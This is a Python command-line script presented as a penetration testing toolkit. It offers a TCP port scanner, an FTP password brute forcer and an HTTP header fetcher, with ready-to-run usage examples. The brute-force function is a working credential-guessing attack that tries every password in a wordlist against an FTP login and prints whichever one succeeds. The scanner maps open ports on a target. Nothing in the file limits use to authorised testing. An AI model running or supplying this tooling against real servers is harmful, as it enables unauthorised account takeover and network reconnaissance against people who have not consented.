import socket
import ftplib
import requests
import argparse
from datetime import datetime

def port_scanner(ip, start_port, end_port):
    print("\n=== Penetration Testing Toolkit ===")
    print(f"[Started] {datetime.now()}\n")
    print(f"[+] Scanning ports {start_port} to {end_port} on {ip}...")
    open_ports = []
    for port in range(start_port, end_port + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            s.connect((ip, port))
            print(f"[OPEN] Port {port}")
            open_ports.append(port)
        except:
            pass
        finally:
            s.close()
    if not open_ports:
        print("[-] No open ports found.")

def ftp_brute_force(ip, username, wordlist_path):
    print(f"\n[*] Starting FTP brute force on {ip} with user: {username}")
    try:
        with open(wordlist_path, 'r') as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
        return

    for pwd in passwords:
        pwd = pwd.strip()
        try:
            ftp = ftplib.FTP(ip)
            ftp.login(user=username, passwd=pwd)
            print(f"[SUCCESS] Username: {username} | Password: {pwd}")
            ftp.quit()
            return
        except ftplib.error_perm:
            print(f"[FAILED] {pwd}")
        except Exception as e:
            print(f"[ERROR] {e}")
            break
    print("[-] Brute force completed.")

def http_header_analyzer(url):
    print(f"\n[*] Analyzing HTTP headers for {url}")
    try:
        response = requests.get(url)
        headers = response.headers
        for header, value in headers.items():
            print(f"{header}: {value}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching URL: {e}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Penetration Testing Toolkit")
    parser.add_argument('--scan', help='IP:start:end - Port scanning')
    parser.add_argument('--ftp', help='IP:username:wordlist.txt - FTP brute force')
    parser.add_argument('--headers', help='http://target.com - HTTP headers')
    args = parser.parse_args()

    if args.scan:
        parts = args.scan.split(":")
        if len(parts) == 3:
            ip = parts[0]
            start_port = int(parts[1])
            end_port = int(parts[2])
            port_scanner(ip, start_port, end_port)
        else:
            print("[!] Invalid scan format. Use IP:start:end")

    elif args.ftp:
        parts = args.ftp.split(":")
        if len(parts) == 3:
            ip = parts[0]
            user = parts[1]
            wordlist = parts[2]
            ftp_brute_force(ip, user, wordlist)
        else:
            print("[!] Invalid FTP format. Use IP:username:wordlist.txt")

    elif args.headers:
        http_header_analyzer(args.headers)

    else:
        print("\nUsage Examples:")
        print("  --scan 192.168.1.1:20:100")
        print("  --ftp 192.168.1.1:admin:wordlist.txt")
        print("  --headers http://example.com")
